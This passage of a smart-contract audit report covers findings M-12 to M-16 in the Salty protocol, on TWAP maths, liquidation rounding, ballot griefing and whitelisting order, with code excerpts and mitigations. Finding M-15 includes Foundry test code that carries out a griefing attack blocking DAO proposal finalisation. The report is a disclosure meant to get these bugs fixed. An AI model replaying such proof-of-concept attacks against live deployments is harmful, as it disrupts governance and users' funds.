		if ( maximumMSB > 80 )
			shift = maximumMSB - 80;

    	// Normalize the inputs to 80 bits.
    	uint256 r0 = reserve0 >> shift;
		uint256 r1 = reserve1 >> shift;
		uint256 z0 = zapAmount0 >> shift;
		uint256 z1 = zapAmount1 >> shift;

		// In order to swap and zap, require that the reduced precision reserves and one of the zapAmounts exceed DUST.
		// Otherwise their value was too small and was crushed by the above precision reduction and we should just return swapAmounts of zero so that default addLiquidity will be attempted without a preceding swap.
        if ( r0 < PoolUtils.DUST)
        	return 0;

        if ( r1 < PoolUtils.DUST)
        	return 0;

        if ( z0 < PoolUtils.DUST)
        if ( z1 < PoolUtils.DUST)
        	return 0;

        // Components of the quadratic formula mentioned in the initial comment block: x = [-B + sqrt(B^2 - 4AC)] / 2A
		uint256 A = 1;
        uint256 B = 2 * r0;

		// Here for reference
//        uint256 C = r0 * ( r0 * z1 - r1 * z0 ) / ( r1 + z1 );
//        uint256 discriminant = B * B - 4 * A * C;

-		// Negate C (from above) and add instead of subtract.
-		// r1 * z0 guaranteed to be greater than r0 * z1 per the conditional check in _determineZapSwapAmount
-       uint256 C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
-       uint256 discriminant = B * B + 4 * A * C;
+       uint256 C;
+       uint256 discriminant;
+       if ((r1 * z0) >= (r0 * z1)) {
+           C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
+           discriminant = B * B + 4 * A * C;
+       } else {
+           C = r0 * ( r0 * z1 - r1 * z0 ) / ( r1 + z1 );
+           discriminant = B * B - 4 * A * C;
+       }

        // Compute the square root of the discriminant.
        uint256 sqrtDiscriminant = Math.sqrt(discriminant);

		// Safety check: make sure B is not greater than sqrtDiscriminant
		if ( B > sqrtDiscriminant )
			return 0;

        // Only use the positive sqrt of the discriminant from: x = (-B +/- sqrtDiscriminant) / 2A
		swapAmount = ( sqrtDiscriminant - B ) / ( 2 * A );

		// Denormalize from the 80 bit representation
		swapAmount <<= shift;
    	}
```

---

### <a id="m-12"></a>[M-12]
## **Incorrect maths calculates inverse TWAP**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L106-L107
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L109-L110
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L125-L126
<br>

## Impact
While calculating the TWAP prices, `CoreUniswapFeed.sol` checks if the tokens have been flipped and if yes, it inverses the TWAP feed value too. This is incorrect maths.<br>
[L106-L110](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L106-L110)
```js
		if ( wbtc_wethFlipped )
			uniswapWBTC_WETH = 10**36 / uniswapWBTC_WETH;

		if ( ! weth_usdcFlipped )
			uniswapWETH_USDC = 10**36 / uniswapWETH_USDC;
```

[L125-L126](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L125-L126)
```js
        if ( ! weth_usdcFlipped )
        	return 10**36 / uniswapWETH_USDC;
```

TWAPs enable contracts to fetch an average price over a given time interval, instead of using the asset spot price at the current instant. This means that prices are significantly harder to manipulate, which is a great safety feature for protocols using these prices. However, while the spot price of token0/token1 can be inverted to get the spot price of token1/token0, the same is not true of TWAPs: the TWAP of token0/token1 cannot be inverted to get the TWAP of token1/token0. The more volatile the price of token0/token1, the more extreme this result is.
<br>

For example, assume we have tokens ABC and DEF, where the price of ABC/DEF at time 1 is 100, and the price at time 5 is 700. With some simplification of scaling, the cumulative prices tracked in Uniswap would be:
```text
cumulativeABC: (1*100)+(4*700) = 2900
cumulativeDEF: (1*1/100)+(4*1/700) = 11/700
```

The average prices over the window from 0 to 5 are therefore calculated as:
```text
averagePriceABC: 2900/5 = 580
averagePriceDEF: 11/700/5 = 0.00314 (approx.)
```

**If instead of using the DEF price of 0.00314, the inverted ABC price is used, this is a price of 1/580 = 0.00172. This is approximately 54% of the correct price.**

## Proof of Concept
- Reference to similar bug flagged by OpenZeppelin: https://solodit.xyz/issues/m05-incorrect-use-of-time-weighted-average-prices-openzeppelin-fei-protocol-audit-phase-2-markdown
- Also refer [official uniswap whitepaper](https://uniswap.org/whitepaper-v3.pdf) section 5.1 which states `"Note that accumulators for token0 and token1 are tracked separately, since the time-weighted arithmetic mean price of token0 is not equivalent to the reciprocal of the time-weighted arithmetic mean price of token1."`.

## Additional Note
It also appears that the issue runs deeper into the [_getUniswapTwapWei()](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L49-L73) function. While the `p` on [L61](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L61) is actually the `token0/token1` price, what is returned by the function is `amount of token0 * (10**18) given token1` as mentioned on [L49](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L49). To achieve this, `p` is used in the denominator i.e. effectively inversed and multiplied (on L67, L70 and L72). This again is wrong. The protocol is trying to express token1 in terms of token0 by using `p` which is actually the expression of token0 in terms of token1. <br>
The protocol needs to use a different feed address which provides TWAP values for `token1/token0` pair and use that instead.

## Tools used
Manual inspection

## Recommended Mitigation Steps
Consider updating the code to ensure that Uniswap TWAPs are never inverted using a reciprocal, and instead the inverse accumulator is used to correctly calculate the inverse TWAP.


---

### <a id="m-13"></a>[M-13]
## **Individual TWAP feeds should not be multiplied or divided to calculate final value in getTwapWBTC()**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L112
<br>

## Impact
[getTwapWBTC()](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L112) calculates TWAP value of WBTC/USD by first fetching WBTC/WETH and WETH/USDC TWAPS, and then dividing them to return the result. This is incorrect maths and unlike spot prices, two TWAPS can not be multiplied or divided to calculate the third TWAP. Just generally in mathematics, two averages when multiplied or divided are not supposed to necessarily yield the value of a third average:
```js
        return ( uniswapWETH_USDC * 10**18) / uniswapWBTC_WETH;
```

This particular report will highlight the fact that 2 different feeds can not be divided or multiplied to obtain the TWAP price of another i.e.:
- Multiplication style:
    - If $\text{TWAP of tokenX/tokenA = P}$
    - And $\text{TWAP of tokenA/tokenY = Q}$
    - Then $\text{TWAP of }$ $tokenX/tokenY \not = P * Q$ (_may be equal in some cases, but not necessarily_)

- Division style:
    - If $\text{TWAP of tokenX/tokenA = P}$
    - And $\text{TWAP of tokenY/tokenA = Q}$
    - Then $\text{TWAP of }$ $tokenX/tokenY \not = P/Q$ (_may be equal in some cases, but not necessarily_)

Attempting to do so results in an incorrect value. The more volatile the price feeds are, the more extreme this result is. Example presented in the PoC section.
<br>

## Some additional input
**_Note_** that this particular issue is distinct from some of the other ones, like the issue titled `"Incorrect maths calculates inverse TWAP"` which highlighted the improper inverting of token0/token1 TWAP feed while calculating token1/token0. That's because in the `Multiplication style` mentioned above, there is no _"virtual inverse"_ happening (otherwise one could have made an argument that in the Division style example, we effectively calculated 1/TWAP of tokenY/tokenA TWAP and then multiplied, choosing to represent it as a division, which would make this issue quite similar to the other issue `"Incorrect maths calculates inverse TWAP"`). <br>
The current issue persists even in the absence of an inverse TWAP and is hence distinct. Consider this:
- If `wbtc_wethFlipped = true` on [L106](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L106) then TWAP `uniswapWBTC_WETH` is flipped. Let's say that `ORIGINAL_uniswapWBTC_WETH` feed was flipped to get `uniswapWBTC_WETH`.
- Then if `weth_usdcFlipped = true` on [L109](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L109) then TWAP `uniswapWETH_USDC` is **NOT** flipped. So we are okay here.
- Then [L112](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreUniswapFeed.sol#L112) attempts to divide by `uniswapWBTC_WETH` which is the same as multiplying with `1/uniswapWBTC_WETH` which is the same as multiplying with `ORIGINAL_uniswapWBTC_WETH`. 

So basically, no contribution was made by the "inverse issue" to any error which may happen here. <br>
Now we move on to verify the issue at hand - that of incorrectly using 2 TWAPS to calculate a third one. 

## Proof of Concept
We'll formulate a simplified example to show the issue. The actual Uniswap TWAP has cumulative prices stored which are then used for further calculations, but the following example is good enough to highlight the fundamental issue. Let's assume that the following prices exist at different timestamps:
| t  | tokenX spot price            | tokenY spot price         | tokenA spot price         |  tokenX/tokenA         |  tokenA/tokenY          |  
|:--:|:----------------------------:|:-------------------------:|:-------------------------:|:---------------------------------:|:---------------------------------:|
| 1  |        10000                   |         50                |         250                |       40                           |               5                         |
| 2  |        11000                   |         54                |         270                |       40.74074                       |             5                         |
| 3  |        10800                   |         55                |         260                |       41.53846                       |             4.72727                       |
| - | TWAP: (10000+11000+10800)/3 = 10600  | TWAP: (50+54+55)/3 = 53   | TWAP: (250+270+260)/3 = 260   |  TWAP: (40+40.74074+41.53846)/3 = 40.75973 |  TWAP: (5+5+4.72727)/3 = 4.90909    |

As per the protocol's current logic: 
```text
TWAP of tokenX/tokenY = TWAP_tokenX/tokenA * TWAP_tokenA/tokenY = 40.75973 * 4.90909 = 200.09318
```

The actual TWAP however is:
```text
TWAP of tokenX/tokenY = average of spot price ratios at each timestamp = (10000/50 + 11000/54 + 10800/55) / 3 = (200 + 203.70370 + 196.36363) / 3 = 200.02244 
```

Protocol's calculation has a deviation of `0.035%` from the actual TWAP price.
<br>

One can imagine much more volatile prices or difference in degree of fluctuations between tokens would result in a much higher price deviation from the actual figure.

## Mathematical PoC
One can also provide a proof mathematically. Assuming - 
| t  | tokenX spot price            | tokenY spot price         | tokenA spot price         |  tokenX/tokenA         |  tokenA/tokenY          |  
|:--:|:----------------------------:|:-------------------------:|:-------------------------:|:---------------------------------:|:---------------------------------:|
| 1  |        x1                   |         y1                |         a1                |       xa1 = x1/a1                       |             ay1 = a1/y1                         |
| 2  |        x2                   |         y2                |         a2                |       xa2 = x2/a2                       |             ay2 = a2/y2                         |
| 3  |        x3                   |         y3                |         a3                |       xa3 = x3/a3                       |             ay3 = a3/y3                         |
| -  | TWAP: (x1+x2+x3)/3          | TWAP: (y1+y2+y3)/3        | TWAP: (a1+a2+a3)/3        |  TWAP: (xa1+xa2+xa3)/3                  |  TWAP: (ay1+ay2+ay3)/3                  |

As per the protocol's current logic: 
```text
TWAP of tokenX/tokenY = TWAP_tokenX/tokenA * TWAP_tokenA/tokenY = (xa1+xa2+xa3)/3 * (ay1+ay2+ay3)/3 = (xa1+xa2+xa3) * (ay1+ay2+ay3) / 9 = (x1/a1 + x2/a2 + x3/a3) * (a1/y1 + a2/y2 + a3/y3) / 9
```

The actual TWAP however is:
```text
TWAP of tokenX/tokenY = average of spot price ratios at each timestamp = (x1/y1 + x2/y2 + x3/y3) / 3 
```

It's trivial to see from here on that the two expressions are not equal.

## Tools used
Manual inspection

## Recommended Mitigation Steps
- Either consider updating the code to fetch the price from the exact token pair TWAP feed instead of calculating through other token pairs 
- OR Fetch the spot prices for token0 & token1 at each time stamp for a certain duration of time and then calculate the average within a new function.


---

### <a id="m-14"></a>[M-14]
## **Liquidators will miss to spot some undercollateralized loans because findLiquidatableUsers() fails to find them**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L326
<br>

## Impact
Throughout the protocol, `maxBorrowable` is calculated based on the collateral deposited, like in [canUserBeLiquidated()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L307):
```js
306:		// Make sure the user's position is under collateralized
307:		return (( userCollateralValue * 100 ) / usdsBorrowedAmount) < stableConfig.minimumCollateralRatioPercent();
```

or as in [maxBorrowableUSDS()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L280)
```js
280:		uint256 maxBorrowableAmount = ( userCollateralValue * 100 ) / stableConfig.initialCollateralRatioPercent();
```

The protocol also provides external facing function [findLiquidatableUsers()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L345) which will be called by interested parties on the lookout of a liquidation opportunity and when found, call `liquidateUser()`. However, due to rounding down error [on the following line](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L326), where the protocol **_performs the calculation the other way round without rounding it up_** ( figures out collateral required based on current borrowed amount ), there would be loans where actually `canUserBeLiquidated() = true` but still findLiquidatableUsers() will miss:
```js
325:				// Determine the minCollateralValue a user needs to have based on their borrowedUSDS
326:				uint256 minCollateralValue = (usdsBorrowedByUsers[wallet] * stableConfig.minimumCollateralRatioPercent()) / 100;
```

## Proof of Concept
Consider the following simplified example:
- USD value of collateral deposited by Alice = 3998
- Maximum amount she can borrow while maintaining 200% collateral ratio = 3998 / 2 = 1999
- Market movement causes her collateral value to dip to 2198 USD
- If we call `canUserBeLiquidated()`, then we see the correct picture of whether she is undercollateralized or not i.e below 110% or not:
    - `return (( userCollateralValue * 100 ) / usdsBorrowedAmount) < stableConfig.minimumCollateralRatioPercent()` which equates to `(2198 * 100) / 1999 < 110` or `109.9549 < 110` or simply `109 < 110` since solidity will round-down, which evaluates to `true`. Hence, Alice is undercollateralized.
- Let's see however if an external user calling `findLiquidatableUsers()` is able to detect this:
    - `uint256 minCollateralValue = (usdsBorrowedByUsers[wallet] * stableConfig.minimumCollateralRatioPercent()) / 100` equates to `minCollateralValue = (1999 * 110) / 100 = 2198.9 = 2198 (rouded-down)`. 
    - Since Alice has 2198 USD worth of collateral, she is not flagged as a `liquidatableUser` on [L332-L334](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L332-L334) despite being so.

## Tools used
Manual review

## Recommended Mitigation Steps
Inside `findLiquidatableUsers()` on [L326](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L326), use OpenZeppelin's `Math.ceilDiv` to calculate `minCollateralValue`. The library is already used across the protocol:
```diff
				// Determine the minCollateralValue a user needs to have based on their borrowedUSDS
-				uint256 minCollateralValue = (usdsBorrowedByUsers[wallet] * stableConfig.minimumCollateralRatioPercent()) / 100;
+				uint256 minCollateralValue = Math.ceilDiv(usdsBorrowedByUsers[wallet] * stableConfig.minimumCollateralRatioPercent(), 100);
```


---

### <a id="m-15"></a>[M-15]
## **finalizeBallot() can be griefed in cases of proposeSetContractAddress() and proposeWebsiteUpdate()**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L103
<br>

## Impact
Consider the following scenario:
- Charlie creates a proposal to update website url to `https://someNewURL`. 
- Just a few minutes before 11 days pass, Alice griefs this by creating a new proposal to update the website url to `https://someNewURL_confirm`. All she has done is append a suffix `_confirm` at the end of the ballotName here.
- 11 days pass and `dao.finalizeBallot()` is called which as per current implementation, internally creates a new proposal having the ballotName `https://someNewURL_confirm`. 
- Since a proposal with this ballotName was already created by Alice, we can not finalize for the next 11 days.
- Alice's proposal will have to first pass/fail, then be finalized by DAO so that it is no more in the `openBallotsByName` mapping. Only after that, can Charlie's ballot be finalized.
- Alice could again choose to grief the re-attempt by DAO to finalize Charlie's ballot (by creating a new proposal exactly like the last time), which again causes another waiting period of 11 days.

The above vulnerability exists not only for `proposeWebsiteUpdate()` but also for `proposeSetContractAddress()` since both of them allow providing a user defined ballotName.
<br>

Relevant code snippets inside [Proposals.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol) highlighting the vulnerability:
```js
  240           function proposeSetContractAddress( string calldata contractName, address newAddress, string calldata description ) external nonReentrant returns (uint256 ballotID)
  241                   {
  242                   require( newAddress != address(0), "Proposed address cannot be address(0)" );
  243
  244 @--------->       string memory ballotName = string.concat("setContract:", contractName );
  245                   return _possiblyCreateProposal( ballotName, BallotType.SET_CONTRACT, newAddress, 0, "", description );
  246                   }
  247
  248
  249           function proposeWebsiteUpdate( string calldata newWebsiteURL, string calldata description ) external nonReentrant returns (uint256 ballotID)
  250                   {
  251                   require( keccak256(abi.encodePacked(newWebsiteURL)) != keccak256(abi.encodePacked("")), "newWebsiteURL cannot be empty" );
  252
  253 @--------->       string memory ballotName = string.concat("setURL:", newWebsiteURL );
  254                   return _possiblyCreateProposal( ballotName, BallotType.SET_WEBSITE_URL, address(0), 0, newWebsiteURL, description );
  255                   }
```

```js
  81            function _possiblyCreateProposal( string memory ballotName, BallotType ballotType, address address1, uint256 number1, string memory string1, string memory string2 ) internal returns (uint256 ballotID)
  82                    {
  83                    require( block.timestamp >= firstPossibleProposalTimestamp, "Cannot propose ballots within the first 45 days of deployment" );
  84
  85                    // The DAO can create confirmation proposals which won't have the below requirements
  86                    if ( msg.sender != address(exchangeConfig.dao() ) )
  87                            {
  88                            // Make sure that the sender has the minimum amount of xSALT required to make the proposal
  89                            uint256 totalStaked = staking.totalShares(PoolUtils.STAKED_SALT);
  90                            uint256 requiredXSalt = ( totalStaked * daoConfig.requiredProposalPercentStakeTimes1000() ) / ( 100 * 1000 );
  91
  92                            require( requiredXSalt > 0, "requiredXSalt cannot be zero" );
  93
  94                            uint256 userXSalt = staking.userShareForPool( msg.sender, PoolUtils.STAKED_SALT );
  95                            require( userXSalt >= requiredXSalt, "Sender does not have enough xSALT to make the proposal" );
  96
  97                            // Make sure that the user doesn't already have an active proposal
  98                            require( ! _userHasActiveProposal[msg.sender], "Users can only have one active proposal at a time" );
  99                            }
  100
  101                   // Make sure that a proposal of the same name is not already open for the ballot
  102                   require( openBallotsByName[ballotName] == 0, "Cannot create a proposal similar to a ballot that is still open" );
  103 @--------->       require( openBallotsByName[ string.concat(ballotName, "_confirm")] == 0, "Cannot create a proposal for a ballot with a secondary confirmation" );
  104
  105                   uint256 ballotMinimumEndTime = block.timestamp + daoConfig.ballotMinimumDuration();
                        .....
                        .....
                        .....
```
<br>

**Note that** in general, a front-running vulnerability exists within the protocol's design. This is because new proposals are not allowed if a previous one with the same ballotName exists. This check is done on ballotName instead of the auto-incrementing ballotId. As such any new proposal can be front-run by a malicious user, hence delaying the process by 11 days or more.

## Proof of Concept
Add the following tests inside `src/dao/tests/DAO.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_grief` to see both the tests fail with the reason:
```text
[FAIL. Reason: revert: Cannot create a proposal similar to a ballot that is still open]
```
<br>

```js
    function test_griefSetWebsite() public
    	{
        vm.startPrank(DEPLOYER);
        staking.stakeSALT( 1000000 ether );
		string memory proposedWebsiteURL = "https://new.com";
        proposals.proposeWebsiteUpdate( proposedWebsiteURL,  "description" );
		assertEq(proposals.ballotForID(1).ballotIsLive, true, "Ballot not correctly created");
        proposals.castVote(1, Vote.YES);
		vm.stopPrank();

		// griefing atack by Alice
		skip(10 days + 23 hours + 55 minutes);
		vm.startPrank(alice);
        staking.stakeSALT( 1000000 ether );
        proposals.proposeWebsiteUpdate( string.concat(proposedWebsiteURL, "_confirm"),  "griefed" );
		vm.stopPrank();

        // Increase block time and try to finalize the ballot
        skip(5 minutes);
        dao.finalizeBallot(1);
    	}

    function test_griefSetContractAddress() public
    	{
        vm.startPrank(DEPLOYER);
        staking.stakeSALT( 1000000 ether );
		string memory contractName = "contractName";
        proposals.proposeSetContractAddress( contractName, address(0x1231236), "description" );
		assertEq(proposals.ballotForID(1).ballotIsLive, true, "Ballot not correctly created");
        proposals.castVote(1, Vote.YES);
		vm.stopPrank();

		// griefing atack by Alice
		skip(10 days + 23 hours + 55 minutes);
		vm.startPrank(alice);
        staking.stakeSALT( 1000000 ether );
        proposals.proposeSetContractAddress( string.concat(contractName, "_confirm"), address(0x1231237), "griefed" );
		vm.stopPrank();

        // Increase block time and try to finalize the ballot
        skip(5 minutes);
        dao.finalizeBallot(1);
    	}
```

## Tools used
Foundry

## Recommended Mitigation Steps
Make sure that the sender can not have a ballotName ending in `_confirm`, if the length of ballotName is greater than 7 letters. Here's where the change needs to be inserted:
```diff
	function _possiblyCreateProposal( string memory ballotName, BallotType ballotType, address address1, uint256 number1, string memory string1, string memory string2 ) internal returns (uint256 ballotID)
		{
		require( block.timestamp >= firstPossibleProposalTimestamp, "Cannot propose ballots within the first 45 days of deployment" );

		// The DAO can create confirmation proposals which won't have the below requirements
		if ( msg.sender != address(exchangeConfig.dao() ) )
			{
+			// Make sure that the sender can not have a ballotName ending in `_confirm`, if the length of ballotName is greater than 7 letters
+			require(last8lettersAreAsExpected(ballotName), "invalid ballot name");
			// Make sure that the sender has the minimum amount of xSALT required to make the proposal
			uint256 totalStaked = staking.totalShares(PoolUtils.STAKED_SALT);
			uint256 requiredXSalt = ( totalStaked * daoConfig.requiredProposalPercentStakeTimes1000() ) / ( 100 * 1000 );

			require( requiredXSalt > 0, "requiredXSalt cannot be zero" );

			uint256 userXSalt = staking.userShareForPool( msg.sender, PoolUtils.STAKED_SALT );
			require( userXSalt >= requiredXSalt, "Sender does not have enough xSALT to make the proposal" );

			// Make sure that the user doesn't already have an active proposal
			require( ! _userHasActiveProposal[msg.sender], "Users can only have one active proposal at a time" );
			}

		// Make sure that a proposal of the same name is not already open for the ballot
		require( openBallotsByName[ballotName] == 0, "Cannot create a proposal similar to a ballot that is still open" );
		require( openBallotsByName[ string.concat(ballotName, "_confirm")] == 0, "Cannot create a proposal for a ballot with a secondary confirmation" );

		uint256 ballotMinimumEndTime = block.timestamp + daoConfig.ballotMinimumDuration();

		// Add the new Ballot to storage
		ballotID = nextBallotID++;
		ballots[ballotID] = Ballot( ballotID, true, ballotType, ballotName, address1, number1, string1, string2, ballotMinimumEndTime );
		openBallotsByName[ballotName] = ballotID;
		_allOpenBallots.add( ballotID );

		// Remember that the user made a proposal
		_userHasActiveProposal[msg.sender] = true;
		_usersThatProposedBallots[ballotID] = msg.sender;

		emit ProposalCreated(ballotID, ballotType, ballotName);
		}
```


---

### <a id="m-16"></a>[M-16]
## **token-whitelisting-ballot ordering not respected which can cause loss of opportunity of whitelisting for the token**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L425
<br>

## Impact
To understand the vulnerability, we need to keep in mind the following facts about the token-whitelisting-ballot -
- While finalizing a ballot, it's checked whether quorum has been met or not [based on current, live value of total staked salt shares](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L320)
- Voting on a ballot can continue to go on until [finalizeBallot()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L278) has not marked the ballot as finalized, which can happen at any time past the deadline.
- In case of [_finalizeTokenWhitelisting()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L235), the call may revert due to `saltBalance` being insufficient or the ballot not being the "top-most" one with most votes. In such a case, users are free to try finalizing it at a later point of time.
- More than one token whitelisting ballots can exist in the "queue" which is stored inside `EnumerableSet.UintSet private _openBallotsForTokenWhitelisting` declared [here](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L48). These ballots are added to the queue each time a proposal is created for token whitelisting.
- From the queue, the ballot having most `yes` votes is considered first to be whitelisted. The [tokenWhitelistingBallotWithTheMostVotes()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L423-L425) function does the job of finding the top-most ballot:
```js
	// Returns the ballotID of the whitelisting ballot that currently has the most yes votes
	// Requires that the quorum has been reached and that the number of yes votes is greater than the number no votes
	function tokenWhitelistingBallotWithTheMostVotes() external view returns (uint256)
		{
		uint256 quorum = requiredQuorumForBallotType( BallotType.WHITELIST_TOKEN);

		uint256 bestID = 0;
		uint256 mostYes = 0;
		for( uint256 i = 0; i < _openBallotsForTokenWhitelisting.length(); i++ )
			{
			uint256 ballotID = _openBallotsForTokenWhitelisting.at(i);
			uint256 yesTotal = _votesCastForBallot[ballotID][Vote.YES];
			uint256 noTotal = _votesCastForBallot[ballotID][Vote.NO];

			if ( (yesTotal + noTotal) >= quorum ) // Make sure that quorum has been reached
			if ( yesTotal > noTotal )  // Make sure the token vote is favorable
			if ( yesTotal > mostYes )  // Make sure these are the most yes votes seen
				{
				bestID = ballotID;
				mostYes = yesTotal;
				}
			}

		return bestID;
		}
```
In the first loop iteration, it assigns the ballot at `i=0` as the top-most. Then, in subsequent iterations in order for another ballot to be considered as top-most, they need to have 1 more `yes` vote than the current top. 
<br>

- This is problematic because as per [OpenZeppelin's official documentation on EnumerableSet.UintSet](https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet-at-struct-EnumerableSet-UintSet-uint256-):
> Note that there are no guarantees on the ordering of values inside the array, and it may change when more values are added or removed.
<br>

This can cause a token to lose out on the opportunity of being whitelisted in spite of landing in a position of satisfying all the checks initially. Details provided below in the PoC section. A coded-style PoC is being skipped because it's not possible to consistently reproduce & showcase _EnumerableSet.UintSet's_ random index shuffling behaviour which would change with each execution and every workstation.

## Proof of Concept
- Step1: ProposalA submitted for whitelisting of tokenA with deadline of timestamp `t`. 

- Step2: **ProposalB** submitted for whitelisting of tokenB with deadline `t+10`. This is the proposal we will closely track.

- Step3: ProposalC submitted for whitelisting of tokenC with deadline `t+20`. Let's assume these items have been stored in `EnumerableSet.UintSet private _openBallotsForTokenWhitelisting` at indices 0, 1 and 2 respectively. Additional proposals beyond these 3 may exist too, which we won't actively track for this example.

- Step4: Let's suppose the total staked salt when the above proposals were created to be `100`. Hence quorum required is 20% of 100 = `20`.

- Step5: At `t`, function [finalizeBallot()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L278) is called for ProposalA. It successfully passes the conditions of [canFinalizeBallot()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L385). Then, count of `No` votes is found to be greater than `Yes`, so it fails the [conditional check here](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L237) and is removed from the "queue" [here](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L272). At this point note that as per OpenZeppelin's note referenced above, deletion of an item from `_openBallotsForTokenWhitelisting` can very well result in the order of indices being shuffled such that ProposalC is moved to index 0 while **ProposalB** remains at 1. Let's be optimistic here and continue to assume no index reshuffling happened and ProposalB still comes before ProposalC.

- Step6: At `t+10`, `finalizeBallot()` is called for **ProposalB**. Imagine the voting split to be `YES = 22; NO = 0`. It has more than required quorum at `22`. Unfortunately, `saltBalance < bootstrappingRewards * 2` at this moment and hence the function call reverts [here](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L247). We can try finalizing it later.

- Step7: _(Optional step) :_ At `t+19`, few more users stake their salt increasing its value from 100 to `150`. New quorum required would be `30`. 

- Step8: Imagine that meanwhile a few more proposal addition/deletions have happened to the queue now, which would almost certainly randomly shuffle the existing indices. We have to consider the possibility now that ProposalB's index comes _after_ that of ProposalC.

- Step9: At `t+20`, `finalizeBallot()` is called for ProposalC. It has the exact same count of `Yes` votes as ProposalB. Imagine the voting split to be `YES = 22; NO = 8`. It satisfies the new quorum requirement of `30` too. However, now being at an index less than that of ProposalB, when `tokenWhitelistingBallotWithTheMostVotes()` is called inside `_finalizeTokenWhitelisting()` on [L250](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L250), it pips ProposalB for the top spot now. Unfortunately once again, there is insufficient salt balance in the DAO contract so this reverts. We can try again later.

- Step10: At `t+30` DAO contract receives just sufficient enough salt balance now.

- Step11: At `t+31`, `finalizeBallot()` is called for ProposalC again. Same as before, due to being at a lower index, it is considered as the top ballot despite having the same votes as ProposalB and having been submitted later than ProposalB. Note that if the _optional Step7_ took place, ProposalB is not even in the race now since it does not have the required quorum anymore.

- Step12: ProposalC is passed and tokenC is whitelisted. Even with ProposalC out of the way, calling `finalizeBallot()` again for ProposalB is futile at the moment because -
    - The DAO contract's salt balance has again dipped below required now
    - ProposalB needs to wait for more users to vote in order to reach quorum. 

The risk ProposalB carries now is that even though it gained a majority in the past, due to proposal submission ordering not being respected by the protocol there's a possibility that the new additional set of voters may vote against it and tokenB does not get whitelisted.
<br>

It is also important to note that the following configurations were chosen for ease of understanding -
- Choice of Step2 and Step3 with deadlines `t+10` and `t+20`
- Choice of DAO contract not having enough salt in Step6
<br>
<br>

We can very easily now visualize an even simpler situation where the issue still crops up even without these pre-requisites -
- The rest of the conditions remaining the same, let's assume that ProposalB and ProposalC were submitted at timestamps 1 second apart such that their deadlines are `t+10` and `t+11` respectively.

- The salt in the DAO contract is enough. But just enough for 1 whitelisting.

- Due to the addition/deletion of other proposals, the indices get shuffled such that index of ProposalC is lower than that of ProposalB, even though ProposalC was originally submitted later. Note that this is possible even without any extra additions/deletions contributed by other proposals. Even if only our 2 proposals existed in the world, just the simple act of ProposalC being added in the queue after ProposalB could result in it being at index0 and ProposalB pushed to index1 since this is not an array, but an EnumerableSet.UintSet.

- They both reach the same value of quorum and have the exact same number of `Yes` votes.

- At `t+10`, `finalizeBallot()` is called for ProposalB _(signified by transaction **txB**)_ and at `t+11` it's called for ProposalC _(transaction **txC**)_. 

- Due to network congestion or gas fee limits, txB remains in the mempool for a while until txC comes along and joins it too. They will now both be executed in the same block and txC gets ordered before txB. 

- txC would win here due to lower index and will consume all the available DAO salt.

- txB is left hanging now and reverts because of insufficient salt.

Further risks remain the same as before for ProposalB. Additional stakers could come into the picture and quorum requirement could go up. More votes will need to be cast and the proposal may lose in the worst case, or keep waiting for a long time in the best case.

## Tools used
Manual review

## Recommended Mitigation Steps
- Use an array instead of an EnumerableSet.UintSet for `_openBallotsForTokenWhitelisting` so that FIFO (first in - first out) ordering is maintained.
- Also, in general it may be a better idea to snapshot the quorum state & voting power at the time the proposal is created instead of relying on ongoing live values.
